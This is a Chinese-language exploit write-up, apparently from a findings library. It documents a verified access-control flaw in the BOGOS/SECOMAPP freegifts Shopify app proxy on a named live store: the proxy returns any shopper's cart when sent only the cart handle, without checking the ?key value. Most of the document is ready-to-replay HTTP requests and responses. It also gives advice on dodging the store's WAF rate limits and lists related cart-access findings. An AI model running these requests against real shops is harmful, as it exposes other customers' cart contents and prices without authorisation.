# Shopify 第三方 App Proxy 未认证按 cart handle 读他人购物车（忽略 ?key）

归类：unauthorized（应用代理层读写访问控制不一致）
严重度：low
入口：GET https://<shop>/apps/secomapp_freegifts_get_order?ver=3.0
来源：collect.thegamecollection.net（第二店，tgc-collectables.myshopify.com），finding#106（verdict=verified）

## 一句话
Shopify 店面把 /apps/<app> 路径代理给第三方 App。本例是 BOGOS/SECOMAPP freegifts app 的 `/apps/secomapp_freegifts_get_order`：
它读取购物车时**只看 Cookie 里的 `cart=<25位handle>`，不校验 `?key` 能力分量**。全新无凭据会话仅凭 25 位 handle
即可返回该购物车完整内容（行项目 / 金额 / 商品详情 / collections / shopify_cart 对象）；把 key 换成任意错误值仍命中同一车。

## 前置条件
- 目标为 Shopify 托管店，且启用了对应 app proxy（BOGOS/SECOMAPP freegifts）。探测：`/apps/secomapp_freegifts_get_order?ver=3.0` 存在。
- 知道目标购物车的 **25 位 handle**（不可枚举；来自分享的购物车/结账链接、Referer、访问日志、analytics）。
- 无需任何账号 / Cookie / Token（全匿名）。

## 复现

### 1) 会话A 造车，拿到 cookie 结构 `<handle>?key=<32hex>`
```
POST /cart/add.js HTTP/2
Host: <shop>
Content-Type: application/json

{"items":[{"id":53349715280209,"quantity":2}]}
```
→ 200 `Set-Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM%3Fkey%3D0e5d213e9e6628c84e4d8163d2a74103`

### 2) 全新无 cookie 会话，仅凭 handle（去掉 ?key）读取 → 命中
```
GET /apps/secomapp_freegifts_get_order?ver=3.0 HTTP/2
Host: <shop>
Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM      (handle 去掉 ?key)
```
→ 200
```json
{"shop":"tgc-collectables.myshopify.com",
 "cart":[{...}],
 "shopify_cart":{"item_count":1,"total_price":9495,"items":[{...产品详情...}]},
 "customer_tags":null,"discount_codes":[]}
```

### 3) 决定性判据：换成任意错误 key 仍返回同一车（?key 完全未被校验）
```
GET /apps/secomapp_freegifts_get_order?ver=3.0
Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM?key=deadbeefdeadbeefdeadbeefdeadbeef
```
→ 200 同一车 `item_count=1 total_price=9495`

### 4) 阴性对照：无 handle 时返回空车（排除 200 兜底导致误报）
```
GET /apps/secomapp_freegifts_get_order?ver=3.0
(无 Cookie)
```
→ 200 `{"shopify_cart":{"item_count":0,...}}`；随机 25 位 handle 同为空车。

## 判据 / 边界
- 判据：有效 handle + 无 key/错 key → 200 且返回该车完整内容 = 命中；无 handle / 随机 handle → 只回空车 = 排除兜底误报。
- POST 写路径不产生状态变更；跨店/跨人参数被忽略（仅读取面）。
- handle 不可枚举 → 影响面取决于 handle 泄漏场景。

## 失败常见原因
- 目标未启用该 app proxy → /apps/... 404 或落到 404 页面。
- 拿不到有效 handle（不可枚举）→ 只见空车；这是关键门槛。
- handle 与店铺绑定，换店铺无效。
- WAF 限速：单线程、请求间隔 ≥4s。

## 关联
与库内「Shopify 购物车只读键未强制」族同源，但**入口是独立的第三方 app proxy**，需单独探测：
- #524 Storefront API /api/graphql `cart(id)` 忽略 ?key
- #542 Storefront API `node(id:)` 忽略 ?key
- #549 Ajax Cart API `GET /cart.js` 裸 handle
- #576 同店 www.thegamecollection.net 的 /cart.js + /api/graphql
- #577 购物车 permalink `/cart/c/{handle}`